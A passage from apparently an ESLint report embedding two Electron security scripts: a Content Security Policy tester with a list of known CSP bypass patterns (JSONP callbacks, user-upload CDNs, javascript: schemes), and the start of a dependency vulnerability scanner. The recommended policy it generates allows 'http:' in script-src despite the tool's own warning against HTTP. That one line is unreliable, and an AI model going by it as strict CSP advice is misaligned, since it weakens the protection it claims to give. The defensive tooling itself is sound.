'blob:']\n  },\n  \n  // Recommended strict values\n  recommended: {\n    'default-src': [\"'self'\"],\n    'script-src': [\"'self'\", \"'nonce-'\", \"'strict-dynamic'\"],\n    'style-src': [\"'self'\", \"'nonce-'\"],\n    'img-src': [\"'self'\", \"data:\", \"https:\"],\n    'connect-src': [\"'self'\", \"wss:\", \"https:\"],\n    'font-src': [\"'self'\"],\n    'object-src': [\"'none'\"],\n    'frame-ancestors': [\"'none'\"],\n    'base-uri': [\"'self'\"],\n    'form-action': [\"'self'\"]\n  },\n  \n  // Known bypass patterns\n  bypassPatterns: [\n    // CDNs that allow user uploads\n    'cdnjs.cloudflare.com',\n    'unpkg.com',\n    'jsdelivr.net',\n    'raw.githubusercontent.com',\n    \n    // JSONP endpoints\n    'callback=',\n    'jsonp=',\n    '.json?',\n    'api.*callback',\n    \n    // Unsafe schemes\n    'filesystem:',\n    'blob:',\n    'data:text/html',\n    'javascript:'\n  ]\n};\n\nclass CSPSecurityTester {\n  constructor() {\n    this.results = {\n      passed: true,\n      violations: [],\n      warnings: [],\n      info: [],\n      cspPolicies: [],\n      score: 100,\n      compliance: {\n        owaspTop10: true,\n        electronSecurity: true,\n        strictCSP: false\n      }\n    };\n  }\n\n  async run(projectRoot = process.cwd()) {\n    console.log('ðŸ”’ Starting CSP Security Testing for Electron App...\\n');\n    \n    try {\n      // 1. Find and analyze CSP configurations\n      await this.findCSPConfigurations(projectRoot);\n      \n      // 2. Analyze each CSP policy\n      for (const policy of this.results.cspPolicies) {\n        await this.analyzeCSP(policy);\n      }\n      \n      // 3. Test for Electron-specific CSP issues\n      await this.testElectronCSP(projectRoot);\n      \n      // 4. Check for bypass vulnerabilities\n      await this.checkBypassVulnerabilities();\n      \n      // 5. Generate compliance report\n      this.generateComplianceReport();\n      \n      // 6. Calculate final score\n      this.calculateScore();\n      \n      // 7. Generate reports\n      await this.generateReports(projectRoot);\n      \n      // Print summary\n      this.printSummary();\n      \n      return this.results.passed;\n    } catch (error) {\n      console.error('âŒ CSP testing failed:', error.message);\n      return false;\n    }\n  }\n\n  /**\n   * Find CSP configurations in the project\n   */\n  async findCSPConfigurations(projectRoot) {\n    console.log('ðŸ” Searching for CSP configurations...');\n    \n    const cspLocations = [\n      // HTML files\n      { pattern: '**/*.html', type: 'html' },\n      // JavaScript files (BrowserWindow configurations)\n      { pattern: '**/main*.{js,ts}', type: 'electron-main' },\n      { pattern: '**/preload*.{js,ts}', type: 'electron-preload' },\n      // Configuration files\n      { pattern: '**/csp.config.{js,json}', type: 'config' },\n      { pattern: '**/security.config.{js,json}', type: 'config' }\n    ];\n    \n    for (const location of cspLocations) {\n      await this.searchForCSP(projectRoot, location);\n    }\n    \n    if (this.results.cspPolicies.length === 0) {\n      this.results.violations.push({\n        severity: 'critical',\n        message: 'No Content Security Policy found',\n        recommendation: 'Implement a strict CSP to protect against XSS attacks'\n      });\n      this.results.passed = false;\n    }\n    \n    console.log(`Found ${this.results.cspPolicies.length} CSP configurations\\n`);\n  }\n\n  async searchForCSP(projectRoot, location) {\n    const glob = require('glob');\n    const files = glob.sync(location.pattern, {\n      cwd: projectRoot,\n      ignore: ['**/node_modules/**', '**/dist/**', '**/build/**']\n    });\n    \n    for (const file of files) {\n      const filePath = path.join(projectRoot, file);\n      const content = await fs.readFile(filePath, 'utf8');\n      \n      // Extract CSP based on file type\n      const policies = this.extractCSP(content, location.type);\n      \n      policies.forEach(policy => {\n        this.results.cspPolicies.push({\n          file: file,\n          type: location.type,\n          policy: policy,\n          parsed: this.parseCSP(policy)\n        });\n      });\n    }\n  }\n\n  extractCSP(content, type) {\n    const policies = [];\n    \n    switch (type) {\n      case 'html':\n        // Look for meta tags\n        const metaRegex = /<meta[^>]*http-equiv=\"Content-Security-Policy\"[^>]*content=\"([^\"]+)\"/gi;\n        let match;\n        while ((match = metaRegex.exec(content)) !== null) {\n          policies.push(match[1]);\n        }\n        break;\n        \n      case 'electron-main':\n        // Look for webPreferences.contentSecurityPolicy\n        const cspRegex = /contentSecurityPolicy\\s*:\\s*[\"'`]([^\"'`]+)[\"'`]/g;\n        let electronMatch;\n        while ((electronMatch = cspRegex.exec(content)) !== null) {\n          policies.push(electronMatch[1]);\n        }\n        \n        // Also check for session.defaultSession.webRequest patterns\n        const sessionRegex = /setResponseHeader.*Content-Security-Policy.*[\"'`]([^\"'`]+)[\"'`]/g;\n        let sessionMatch;\n        while ((sessionMatch = sessionRegex.exec(content)) !== null) {\n          policies.push(sessionMatch[1]);\n        }\n        break;\n        \n      case 'config':\n        // Try to parse as JSON or JS module\n        try {\n          const configData = JSON.parse(content);\n          if (configData.csp) policies.push(configData.csp);\n          if (configData.contentSecurityPolicy) policies.push(configData.contentSecurityPolicy);\n        } catch {\n          // Not JSON, try regex for JS exports\n          const exportRegex = /(?:export\\s+(?:default\\s+)?|module\\.exports\\s*=\\s*).*csp['\"]\\s*:\\s*[\"'`]([^\"'`]+)[\"'`]/g;\n          let exportMatch;\n          while ((exportMatch = exportRegex.exec(content)) !== null) {\n            policies.push(exportMatch[1]);\n          }\n        }\n        break;\n    }\n    \n    return policies;\n  }\n\n  parseCSP(policyString) {\n    try {\n      return parse(policyString);\n    } catch {\n      // Fallback to manual parsing\n      const directives = {};\n      const parts = policyString.split(';').map(p => p.trim()).filter(Boolean);\n      \n      parts.forEach(part => {\n        const [directive, ...values] = part.split(/\\s+/);\n        if (directive) {\n          directives[directive] = values;\n        }\n      });\n      \n      return directives;\n    }\n  }\n\n  /**\n   * Analyze a CSP policy for security issues\n   */\n  async analyzeCSP(policyConfig) {\n    console.log(`ðŸ“‹ Analyzing CSP from ${policyConfig.file}...`);\n    \n    const { parsed } = policyConfig;\n    \n    // Check for required directives\n    CSP_REQUIREMENTS.required.forEach(directive => {\n      if (!parsed[directive]) {\n        this.results.violations.push({\n          severity: 'high',\n          file: policyConfig.file,\n          message: `Missing required directive: ${directive}`,\n          recommendation: `Add ${directive} with restrictive values`\n        });\n      }\n    });\n    \n    // Check for forbidden values\n    Object.entries(CSP_REQUIREMENTS.forbidden).forEach(([directive, forbidden]) => {\n      const values = parsed[directive] || [];\n      forbidden.forEach(forbiddenValue => {\n        if (values.includes(forbiddenValue)) {\n          this.results.violations.push({\n            severity: 'critical',\n            file: policyConfig.file,\n            message: `Unsafe directive found: ${directive} contains '${forbiddenValue}'`,\n            recommendation: `Remove '${forbiddenValue}' and use nonces or 'strict-dynamic' instead`\n          });\n          this.results.passed = false;\n        }\n      });\n    });\n    \n    // Check for overly permissive policies\n    this.checkPermissivePolicies(parsed, policyConfig.file);\n    \n    // Check for nonce implementation\n    this.checkNonceImplementation(parsed, policyConfig.file);\n    \n    // Check for recommended values\n    this.checkRecommendedValues(parsed, policyConfig.file);\n  }\n\n  checkPermissivePolicies(parsed, file) {\n    // Check for wildcard in critical directives\n    const criticalDirectives = ['default-src', 'script-src', 'style-src', 'connect-src'];\n    \n    criticalDirectives.forEach(directive => {\n      const values = parsed[directive] || [];\n      \n      // Check for wildcards\n      if (values.includes('*') || values.some(v => v.includes('*') && !v.includes('.'))) {\n        this.results.violations.push({\n          severity: 'high',\n          file,\n          message: `Overly permissive ${directive} with wildcard`,\n          recommendation: 'Specify exact domains instead of wildcards'\n        });\n      }\n      \n      // Check for http:// (should be https://)\n      if (values.some(v => v.startsWith('http://'))) {\n        this.results.warnings.push({\n          severity: 'medium',\n          file,\n          message: `Insecure HTTP protocol in ${directive}`,\n          recommendation: 'Use HTTPS for all external resources'\n        });\n      }\n    });\n  }\n\n  checkNonceImplementation(parsed, file) {\n    const scriptSrc = parsed['script-src'] || [];\n    const styleSrc = parsed['style-src'] || [];\n    \n    const hasScriptNonce = scriptSrc.some(v => v.includes(\"'nonce-\"));\n    const hasStyleNonce = styleSrc.some(v => v.includes(\"'nonce-\"));\n    \n    if (!hasScriptNonce && !scriptSrc.includes(\"'strict-dynamic'\")) {\n      this.results.warnings.push({\n        severity: 'medium',\n        file,\n        message: 'No nonce or strict-dynamic for script-src',\n        recommendation: 'Implement nonce-based CSP for better security'\n      });\n    }\n    \n    if (!hasStyleNonce && styleSrc.includes(\"'unsafe-inline'\")) {\n      this.results.warnings.push({\n        severity: 'medium',\n        file,\n        message: 'Style-src uses unsafe-inline without nonces',\n        recommendation: 'Implement nonce-based styles or external stylesheets'\n      });\n    }\n  }\n\n  checkRecommendedValues(parsed, file) {\n    Object.entries(CSP_REQUIREMENTS.recommended).forEach(([directive, recommended]) => {\n      const actual = parsed[directive] || [];\n      \n      // Check if directive follows recommendations\n      const followsRecommendation = recommended.every(rec => \n        rec.includes('nonce') || actual.includes(rec)\n      );\n      \n      if (!followsRecommendation && actual.length > 0) {\n        this.results.info.push({\n          file,\n          message: `${directive} could be more restrictive`,\n          recommendation: `Consider using: ${directive} ${recommended.join(' ')}`\n        });\n      }\n    });\n  }\n\n  /**\n   * Test Electron-specific CSP issues\n   */\n  async testElectronCSP(projectRoot) {\n    console.log('ðŸ”Œ Testing Electron-specific CSP configurations...\\n');\n    \n    // Find main process files\n    const mainFiles = require('glob').sync('**/main*.{js,ts}', {\n      cwd: projectRoot,\n      ignore: ['**/node_modules/**', '**/dist/**']\n    });\n    \n    for (const file of mainFiles) {\n      const content = await fs.readFile(path.join(projectRoot, file), 'utf8');\n      \n      // Check for missing CSP in BrowserWindow\n      if (content.includes('new BrowserWindow') && !content.includes('contentSecurityPolicy')) {\n        this.results.warnings.push({\n          severity: 'high',\n          file,\n          message: 'BrowserWindow created without explicit CSP',\n          recommendation: 'Set contentSecurityPolicy in webPreferences'\n        });\n      }\n      \n      // Check for webSecurity disabled\n      if (content.includes('webSecurity: false') || content.includes('webSecurity:false')) {\n        this.results.violations.push({\n          severity: 'critical',\n          file,\n          message: 'webSecurity is disabled',\n          recommendation: 'Never disable webSecurity in production'\n        });\n        this.results.passed = false;\n      }\n      \n      // Check for allowRunningInsecureContent\n      if (content.includes('allowRunningInsecureContent: true')) {\n        this.results.violations.push({\n          severity: 'high',\n          file,\n          message: 'allowRunningInsecureContent is enabled',\n          recommendation: 'Disable allowRunningInsecureContent'\n        });\n      }\n    }\n  }\n\n  /**\n   * Check for CSP bypass vulnerabilities\n   */\n  async checkBypassVulnerabilities() {\n    console.log('ðŸ” Checking for CSP bypass vulnerabilities...\\n');\n    \n    for (const policy of this.results.cspPolicies) {\n      const { parsed, file } = policy;\n      \n      // Check each directive for bypass patterns\n      Object.entries(parsed).forEach(([directive, values]) => {\n        values.forEach(value => {\n          CSP_REQUIREMENTS.bypassPatterns.forEach(pattern => {\n            if (value.includes(pattern)) {\n              this.results.violations.push({\n                severity: 'high',\n                file,\n                message: `Potential CSP bypass: ${directive} includes '${pattern}'`,\n                recommendation: 'Remove or restrict access to user-controllable endpoints'\n              });\n            }\n          });\n        });\n      });\n      \n      // Check for JSONP endpoints\n      const scriptSrc = parsed['script-src'] || [];\n      const connectSrc = parsed['connect-src'] || [];\n      \n      [...scriptSrc, ...connectSrc].forEach(src => {\n        if (src.includes('cdn') || src.includes('api')) {\n          this.results.warnings.push({\n            severity: 'medium',\n            file,\n            message: `External API/CDN in CSP: ${src}`,\n            recommendation: 'Verify that endpoints cannot serve user-controlled content'\n          });\n        }\n      });\n    }\n  }\n\n  /**\n   * Generate compliance report\n   */\n  generateComplianceReport() {\n    // Check OWASP Top 10 compliance\n    this.results.compliance.owaspTop10 = \n      !this.results.violations.some(v => v.severity === 'critical') &&\n      this.results.cspPolicies.length > 0;\n    \n    // Check Electron security compliance\n    this.results.compliance.electronSecurity = \n      !this.results.violations.some(v => \n        v.message.includes('webSecurity') || \n        v.message.includes('allowRunningInsecureContent')\n      );\n    \n    // Check strict CSP compliance\n    this.results.compliance.strictCSP = \n      this.results.cspPolicies.some(p => {\n        const parsed = p.parsed;\n        return (\n          parsed['script-src']?.includes(\"'strict-dynamic'\") ||\n          parsed['script-src']?.some(v => v.includes(\"'nonce-\"))\n        );\n      });\n  }\n\n  /**\n   * Calculate security score\n   */\n  calculateScore() {\n    let score = 100;\n    \n    // Deduct points for violations\n    this.results.violations.forEach(violation => {\n      switch (violation.severity) {\n        case 'critical': score -= 25; break;\n        case 'high': score -= 15; break;\n        case 'medium': score -= 10; break;\n        case 'low': score -= 5; break;\n      }\n    });\n    \n    // Deduct points for warnings\n    this.results.warnings.forEach(warning => {\n      score -= 3;\n    });\n    \n    // Bonus points for strict CSP\n    if (this.results.compliance.strictCSP) {\n      score += 10;\n    }\n    \n    this.results.score = Math.max(0, Math.min(100, score));\n    this.results.passed = this.results.score >= 70 && \n                          !this.results.violations.some(v => v.severity === 'critical');\n  }\n\n  /**\n   * Generate reports\n   */\n  async generateReports(projectRoot) {\n    const outputDir = path.join(projectRoot, 'test-results', 'security');\n    await fs.mkdir(outputDir, { recursive: true });\n    \n    // JSON report\n    const jsonPath = path.join(outputDir, 'csp-security-report.json');\n    await fs.writeFile(jsonPath, JSON.stringify(this.results, null, 2));\n    \n    // HTML report\n    const htmlPath = path.join(outputDir, 'csp-security-report.html');\n    await fs.writeFile(htmlPath, this.generateHTMLReport());\n    \n    // Generate CSP recommendation\n    const recommendedCSP = this.generateRecommendedCSP();\n    const cspPath = path.join(outputDir, 'recommended-csp.txt');\n    await fs.writeFile(cspPath, recommendedCSP);\n    \n    console.log('ðŸ“„ Reports generated:');\n    console.log(`   - JSON: ${jsonPath}`);\n    console.log(`   - HTML: ${htmlPath}`);\n    console.log(`   - Recommended CSP: ${cspPath}\\n`);\n  }\n\n  generateHTMLReport() {\n    return `\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <title>CSP Security Report</title>\n  <style>\n    body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }\n    .header { background: #1a1a1a; color: white; padding: 20px; border-radius: 8px; }\n    .score { font-size: 48px; font-weight: bold; color: ${this.results.score >= 70 ? '#10b981' : '#ef4444'}; }\n    .section { background: white; padding: 20px; margin: 20px 0; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }\n    .violation { border-left: 4px solid #ef4444; padding: 10px; margin: 10px 0; background: #fef2f2; }\n    .warning { border-left: 4px solid #f59e0b; padding: 10px; margin: 10px 0; background: #fffbeb; }\n    .info { border-left: 4px solid #3b82f6; padding: 10px; margin: 10px 0; background: #eff6ff; }\n    .critical { color: #dc2626; font-weight: bold; }\n    .high { color: #ea580c; font-weight: bold; }\n    .medium { color: #f59e0b; }\n    .compliance { display: flex; gap: 20px; }\n    .compliance-item { padding: 10px 20px; border-radius: 4px; }\n    .pass { background: #10b981; color: white; }\n    .fail { background: #ef4444; color: white; }\n  </style>\n</head>\n<body>\n  <div class=\"header\">\n    <h1>Content Security Policy Security Report</h1>\n    <div class=\"score\">Score: ${this.results.score}/100</div>\n    <p>Generated on ${new Date().toLocaleString()}</p>\n  </div>\n\n  <div class=\"section\">\n    <h2>Compliance Status</h2>\n    <div class=\"compliance\">\n      <div class=\"compliance-item ${this.results.compliance.owaspTop10 ? 'pass' : 'fail'}\">\n        OWASP Top 10: ${this.results.compliance.owaspTop10 ? 'PASS' : 'FAIL'}\n      </div>\n      <div class=\"compliance-item ${this.results.compliance.electronSecurity ? 'pass' : 'fail'}\">\n        Electron Security: ${this.results.compliance.electronSecurity ? 'PASS' : 'FAIL'}\n      </div>\n      <div class=\"compliance-item ${this.results.compliance.strictCSP ? 'pass' : 'fail'}\">\n        Strict CSP: ${this.results.compliance.strictCSP ? 'PASS' : 'FAIL'}\n      </div>\n    </div>\n  </div>\n\n  <div class=\"section\">\n    <h2>Violations (${this.results.violations.length})</h2>\n    ${this.results.violations.map(v => `\n      <div class=\"violation\">\n        <div class=\"${v.severity}\">${v.severity.toUpperCase()}: ${v.message}</div>\n        <div>File: ${v.file || 'N/A'}</div>\n        <div>Recommendation: ${v.recommendation}</div>\n      </div>\n    `).join('')}\n  </div>\n\n  <div class=\"section\">\n    <h2>Warnings (${this.results.warnings.length})</h2>\n    ${this.results.warnings.map(w => `\n      <div class=\"warning\">\n        <div class=\"${w.severity}\">${w.message}</div>\n        <div>File: ${w.file || 'N/A'}</div>\n        <div>Recommendation: ${w.recommendation}</div>\n      </div>\n    `).join('')}\n  </div>\n\n  <div class=\"section\">\n    <h2>CSP Policies Found</h2>\n    ${this.results.cspPolicies.map(p => `\n      <div class=\"info\">\n        <strong>File:</strong> ${p.file}<br>\n        <strong>Type:</strong> ${p.type}<br>\n        <strong>Policy:</strong> <code>${p.policy}</code>\n      </div>\n    `).join('')}\n  </div>\n</body>\n</html>\n    `;\n  }\n\n  generateRecommendedCSP() {\n    const nonce = crypto.randomBytes(16).toString('base64');\n    \n    return `# Recommended Strict Content Security Policy for Electron Apps (2025)\n\n# Basic strict CSP with nonces\ndefault-src 'self';\nscript-src 'self' 'nonce-${nonce}' 'strict-dynamic' https: http:;\nstyle-src 'self' 'nonce-${nonce}';\nimg-src 'self' data: https:;\nfont-src 'self';\nconnect-src 'self' wss: https:;\nmedia-src 'self';\nobject-src 'none';\nframe-ancestors 'none';\nbase-uri 'self';\nform-action 'self';\nupgrade-insecure-requests;\n\n# For Electron main process (in webPreferences):\nwebPreferences: {\n  contextIsolation: true,\n  nodeIntegration: false,\n  webSecurity: true,\n  allowRunningInsecureContent: false,\n  contentSecurityPolicy: \"default-src 'self'; script-src 'self' 'nonce-GENERATED_NONCE' 'strict-dynamic'; style-src 'self' 'nonce-GENERATED_NONCE'; img-src 'self' data: https:; font-src 'self'; connect-src 'self' wss: https:; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';\"\n}\n\n# Implementation notes:\n1. Generate a new nonce for each page load\n2. Add nonce attribute to all inline scripts and styles\n3. Use 'strict-dynamic' to allow dynamically created scripts\n4. Never use 'unsafe-inline' or 'unsafe-eval'\n5. Restrict connect-src to specific API endpoints\n6. Use HTTPS for all external resources\n7. Implement CSP reporting: report-uri /csp-violation-report-endpoint/\n`;\n  }\n\n  /**\n   * Print summary to console\n   */\n  printSummary() {\n    console.log('\\nðŸ“Š CSP Security Test Summary:');\n    console.log('â”'.repeat(50));\n    console.log(`   Security Score: ${this.results.score}/100`);\n    console.log(`   Status: ${this.results.passed ? 'âœ… PASSED' : 'âŒ FAILED'}`);\n    console.log(`   Policies Found: ${this.results.cspPolicies.length}`);\n    console.log(`   Violations: ${this.results.violations.length}`);\n    console.log(`   Warnings: ${this.results.warnings.length}`);\n    console.log('â”'.repeat(50));\n    \n    if (!this.results.passed) {\n      console.log('\\nâŒ Critical issues found:');\n      this.results.violations\n        .filter(v => v.severity === 'critical')\n        .forEach(v => console.log(`   - ${v.message}`));\n    }\n  }\n}\n\n// Main execution\nasync function main() {\n  const tester = new CSPSecurityTester();\n  const passed = await tester.run();\n  \n  process.exit(passed ? 0 : 1);\n}\n\n// Run if called directly\nif (require.main === module) {\n  main().catch(error => {\n    console.error('Fatal error:', error);\n    process.exit(1);\n  });\n}\n\nmodule.exports = { CSPSecurityTester, CSP_REQUIREMENTS };","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/scripts/scripts/dependency-vulnerability-scan.js","messages":[{"ruleId":"@typescript-eslint/no-unused-vars","severity":2,"message":"'spawn' is assigned a value but never used.","line":12,"column":9,"nodeType":null,"messageId":"unusedVar","endLine":12,"endColumn":14}],"suppressedMessages":[],"errorCount":1,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Enhanced Dependency Vulnerability Scanner for 2025\n * \n * Implements multi-source vulnerability scanning:\n * - npm audit (built-in)\n * - Snyk API integration\n * - OWASP Dependency Check patterns\n * - RetireJS for frontend libraries\n * - OSV (Open Source Vulnerabilities) database\n */\n\nconst { spawn, exec } = require('child_process');\nconst fs = require('fs').promises;\nconst path = require('path');\nconst https = require('https');\nconst { promisify } = require('util');\nconst execAsync = promisify(exec);\n\n// Configuration\nconst CONFIG = {\n  outputDir: path.join(__dirname, '../test-results/security'),\n  vulnerabilityThresholds: {\n    critical: 0,\n    high: 3,      // Allow up to 3 high vulnerabilities\n    medium: 10,   // Allow up to 10 medium vulnerabilities\n    low: -1       // No limit on low vulnerabilities\n  },\n  scanners: {\n    npm: true,\n    snyk: process.env.SNYK_TOKEN ? true : false,\n    osv: true,\n    retirejs: true\n  }\n};\n\nclass DependencyVulnerabilityScanner {\n  constructor() {\n    this.results = {\n      npm: null,\n      snyk: null,\n      osv: null,\n      retirejs: null,\n      summary: {\n        total: 0,\n        critical: 0,\n        high: 0,\n        medium: 0,\n        low: 0\n      }\n    };\n    this.startTime = Date.now();\n  }\n\n  async run() {\n    console.log('ðŸ” Starting Enhanced Dependency Vulnerability Scan...\\n');\n    \n    try {\n      // Ensure output directory exists\n      await this.ensureOutputDirectory();\n      \n      // Run all scanners in parallel\n      const scanPromises = [];\n      \n      if (CONFIG.scanners.npm) {\n        scanPromises.push(this.runNpmAudit());\n      }\n      \n      if (CONFIG.scanners.snyk) {\n        scanPromises.push(this.runSnykTest());\n      }\n      \n      if (CONFIG.scanners.osv) {\n        scanPromises.push(this.runOSVScan());\n      }\n      \n      if (CONFIG.scanners.retirejs) {\n        scanPromises.push(this.runRetireJS());\n      }\n      \n      // Wait for all scans to complete\n      await Promise.all(scanPromises);\n      \n      // Aggregate results\n      this.aggregateResults();\n      \n      // Generate reports\n      await this.generateReports();\n      \n      // Check against thresholds\n      const passed = this.checkThresholds();\n      \n      // Print summary\n      this.printSummary();\n      \n      return passed;\n    } catch (error) {\n      console.error('âŒ Vulnerability scan failed:', error.message);\n      process.exit(1);\n    }\n  }\n\n  async ensureOutputDirectory() {\n    await fs.mkdir(CONFIG.outputDir, { recursive: true });\n  }\n\n  /**\n   * Run npm audit\n   */\n  async runNpmAudit() {\n    console.log('ðŸ“¦ Running npm audit...');\n    \n    try {\n      const { stdout } = await execAsync('npm audit --json', {\n        maxBuffer: 10 * 1024 * 1024 // 10MB buffer\n      });\n      \n      const auditResult = JSON.parse(stdout);\n      this.results.npm = this.parseNpmAudit(auditResult);\n      \n      console.log('âœ… npm audit completed');\n    } catch (error) {\n      // npm audit returns non-zero exit code if vulnerabilities found\n      if (error.stdout) {\n        try {\n          const auditResult = JSON.parse(error.stdout);\n          this.results.npm = this.parseNpmAudit(auditResult);\n          console.log('âœ… npm audit completed (vulnerabilities found)');\n        } catch (parseError) {\n          console.error('âŒ npm audit failed:', parseError.message);\n        }\n      } else {\n        console.error('âŒ npm audit failed:', error.message);\n      }\n    }\n  }\n\n  parseNpmAudit(auditResult) {\n    const vulnerabilities = [];\n    \n    if (auditResult.vulnerabilities) {\n      Object.entries(auditResult.vulnerabilities).forEach(([pkg, data]) => {\n        data.via.forEach(via => {\n          if (typeof via === 'object') {\n            vulnerabilities.push({\n              package: pkg,\n              severity: via.severity,\n              title: via.title,\n              cve: via.cve,\n              url: via.url,\n              range: data.range,\n              fixAvailable: data.fixAvailable\n            });\n          }\n        });\n      });\n    }\n    \n    return {\n      metadata: auditResult.metadata || {},\n      vulnerabilities\n    };\n  }\n\n  /**\n   * Run Snyk test (requires SNYK_TOKEN environment variable)\n   */\n  async runSnykTest() {\n    console.log('ðŸ”’ Running Snyk test...');\n    \n    if (!process.env.SNYK_TOKEN) {\n      console.log('âš ï¸  Snyk test skipped (SNYK_TOKEN not set)');\n      return;\n    }\n    \n    try {\n      const { stdout } = await execAsync('npx snyk test --json', {\n        maxBuffer: 10 * 1024 * 1024,\n        env: { ...process.env }\n      });\n      \n      const snykResult = JSON.parse(stdout);\n      this.results.snyk = this.parseSnykResults(snykResult);\n      \n      console.log('âœ… Snyk test completed');\n    } catch (error) {\n      if (error.stdout) {\n        try {\n          const snykResult = JSON.parse(error.stdout);\n          this.results.snyk = this.parseSnykResults(snykResult);\n          console.log('âœ… Snyk test completed (vulnerabilities found)');\n        } catch (parseError) {\n          console.error('âŒ Snyk test failed:', parseError.message);\n        }\n      } else {\n        console.error('âŒ Snyk test failed:', error.message);\n      }\n    }\n  }\n\n  parseSnykResults(snykResult) {\n    const vulnerabilities = [];\n    \n    if (snykResult.vulnerabilities) {\n      snykResult.vulnerabilities.forEach(vuln => {\n        vulnerabilities.push({\n          package: vuln.packageName,\n          version: vuln.version,\n          severity: vuln.severity.toLowerCase(),\n          title: vuln.title,\n          cve: vuln.identifiers?.CVE?.[0],\n          cvssScore: vuln.cvssScore,\n          exploitMaturity: vuln.exploit,\n          fixedIn: vuln.fixedIn,\n          isUpgradable: vuln.isUpgradable,\n          isPatchable: vuln.isPatchable\n        });\n      });\n    }\n    \n    return {\n      vulnerabilities,\n      summary: snykResult.summary || {}\n    };\n  }\n\n  /**\n   * Run OSV (Open Source Vulnerabilities) scan\n   */\n  async runOSVScan() {\n    console.log('ðŸŒ Running OSV scan...');\n    \n    try {\n      // Read package-lock.json\n      const packageLockPath = path.join(process.cwd(), 'package-lock.json');\n      const packageLock = JSON.parse(await fs.readFile(packageLockPath, 'utf8'));\n      \n      // Extract all dependencies\n      const packages = this.extractPackagesFromLock(packageLock);\n      \n      // Query OSV API in batches\n      const osvResults = await this.queryOSVDatabase(packages);\n      \n      this.results.osv = {\n        vulnerabilities: osvResults,\n        scannedPackages: packages.length\n      };\n      \n      console.log('âœ… OSV scan completed');\n    } catch (error) {\n      console.error('âŒ OSV scan failed:', error.message);\n    }\n  }\n\n  extractPackagesFromLock(packageLock) {\n    const packages = [];\n    \n    const extractDeps = (deps) => {\n      Object.entries(deps || {}).forEach(([name, data]) => {\n        if (data.version) {\n          packages.push({\n            name,\n            version: data.version,\n            ecosystem: 'npm'\n          });\n        }\n        if (data.dependencies) {\n          extractDeps(data.dependencies);\n        }\n      });\n    };\n    \n    extractDeps(packageLock.dependencies);\n    return packages;\n  }\n\n  async queryOSVDatabase(packages) {\n    const vulnerabilities = [];\n    const batchSize = 100;\n    \n    for (let i = 0; i < packages.length; i += batchSize) {\n      const batch = packages.slice(i, i + batchSize);\n      \n      try {\n        const response = await this.makeOSVRequest(batch);\n        if (response.vulns) {\n          response.vulns.forEach(vuln => {\n            vulnerabilities.push({\n              package: vuln.package.name,\n              version: vuln.package.version,\n              id: vuln.vulns[0].id,\n              summary: vuln.vulns[0].summary,\n              severity: this.mapOSVSeverity(vuln.vulns[0].database_specific),\n              aliases: vuln.vulns[0].aliases\n            });\n          });\n        }\n      } catch (error) {\n        console.error(`OSV batch query failed: ${error.message}`);\n      }\n    }\n    \n    return vulnerabilities;\n  }\n\n  makeOSVRequest(packages) {\n    return new Promise((resolve, reject) => {\n      const data = JSON.stringify({\n        packages: packages\n      });\n      \n      const options = {\n        hostname: 'api.osv.dev',\n        path: '/v1/querybatch',\n        method: 'POST',\n        headers: {\n          'Content-Type': 'application/json',\n          'Content-Length': data.length\n        }\n      };\n      \n      const req = https.request(options, (res) => {\n        let body = '';\n        res.on('data', (chunk) => { body += chunk; });\n        res.on('end', () => {\n          try {\n            resolve(JSON.parse(body));\n          } catch (error) {\n            reject(error);\n          }\n        });\n      });\n      \n      req.on('error', reject);\n      req.write(data);\n      req.end();\n    });\n  }\n\n  mapOSVSeverity(databaseSpecific) {\n    // Map CVSS scores to severity levels\n    const cvss = databaseSpecific?.cvss_v3?.base_score || 0;\n    if (cvss >= 9.0) return 'critical';\n    if (cvss >= 7.0) return 'high';\n    if (cvss >= 4.0) return 'medium';\n    return 'low';\n  }\n\n  /**\n   * Run RetireJS for frontend library scanning\n   */\n  async runRetireJS() {\n    console.log('ðŸŒ Running RetireJS scan...');\n    \n    try {\n      const { stdout } = await execAsync('npx retire --outputformat json', {\n        maxBuffer: 10 * 1024 * 1024\n      });\n      \n      const retireResults = JSON.parse(stdout || '[]');\n      this.results.retirejs = this.parseRetireJSResults(retireResults);\n      \n      console.log('âœ… RetireJS scan completed');\n    } catch (error) {\n      console.error('âŒ RetireJS scan failed:', error.message);\n      this.results.retirejs = { vulnerabilities: [] };\n    }\n  }\n\n  parseRetireJSResults(results) {\n    const vulnerabilities = [];\n    \n    results.forEach(result => {\n      if (result.vulnerabilities) {\n        result.vulnerabilities.forEach(vuln => {\n          vulnerabilities.push({\n            file: result.file,\n            component: result.results?.[0]?.component,\n            version: result.results?.[0]?.version,\n            severity: vuln.severity || 'medium',\n            summary: vuln.summary,\n            cve: vuln.identifiers?.cve?.[0]\n          });\n        });\n      }\n    });\n    \n    return { vulnerabilities };\n  }\n\n  /**\n   * Aggregate results from all scanners\n   */\n  aggregateResults() {\n    // Reset summary\n    this.results.summary = {\n      total: 0,\n      critical: 0,\n      high: 0,\n      medium: 0,\n      low: 0\n    };\n    \n    // Aggregate vulnerabilities from all sources\n    const allVulnerabilities = [];\n    \n    ['npm', 'snyk', 'osv', 'retirejs'].forEach(scanner => {\n      if (this.results[scanner]?.vulnerabilities) {\n        this.results[scanner].vulnerabilities.forEach(vuln => {\n          const severity = vuln.severity?.toLowerCase() || 'unknown';\n          if (this.results.summary[severity] !== undefined) {\n            this.results.summary[severity]++;\n            this.results.summary.total++;\n          }\n          \n          allVulnerabilities.push({\n            ...vuln,\n            source: scanner\n          });\n        });\n      }\n    });\n    \n    // Deduplicate vulnerabilities\n    this.results.aggregated = this.deduplicateVulnerabilities(allVulnerabilities);\n  }\n\n  deduplicateVulnerabilities(vulnerabilities) {\n    const seen = new Map();\n    \n    vulnerabilities.forEach(vuln => {\n      const key = `${vuln.package}-${vuln.cve || vuln.title}`;\n      if (!seen.has(key) || this.getSeverityScore(vuln.severity) > this.getSeverityScore(seen.get(key).severity)) {\n        seen.set(key, vuln);\n      }\n    });\n    \n    return Array.from(seen.values());\n  }\n\n  getSeverityScore(severity) {\n    const scores = { critical: 4, high: 3, medium: 2, low: 1, unknown: 0 };\n    return 